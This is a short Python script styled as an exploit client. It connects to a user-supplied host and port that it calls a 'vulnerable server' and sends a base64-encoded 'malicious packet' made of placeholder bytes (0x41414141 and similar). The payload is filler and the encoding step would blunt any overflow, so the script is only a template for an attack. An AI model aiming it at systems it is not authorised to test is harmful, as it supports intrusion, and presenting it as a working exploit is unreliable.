import socket
import struct
import argparse
import base64
import subprocess
import time

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Parse command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("hostname", help="The hostname of the server to connect to")
parser.add_argument("port", type=int, help="The port number of the server to connect to")
args = parser.parse_args()

# Connect the socket to the port where the server is listening
server_ip = (args.hostname, args.port)

print("..... Getting Ready .....")
time.sleep(2)
print('Connecting to vulnerable server: ---->')
time.sleep(2)
sock.connect(server_ip)

# Construct the malicious packet
exploit_packet = struct.pack('<I', 0x41414141) + \
                 struct.pack('<I', 0x42424242) + \
                 struct.pack('<I', 0x43434343)

# encode the payload to avoid truncation or modification
encoded_payload = base64.b64encode(exploit_packet)
          
# Send the malicious packet
sock.send(encoded_payload)

# Receive the response
response = sock.recv(2048)
print('Getting response from vulnerable server: <----')
time.sleep(3)
print("Did we get it?: --> ",response)
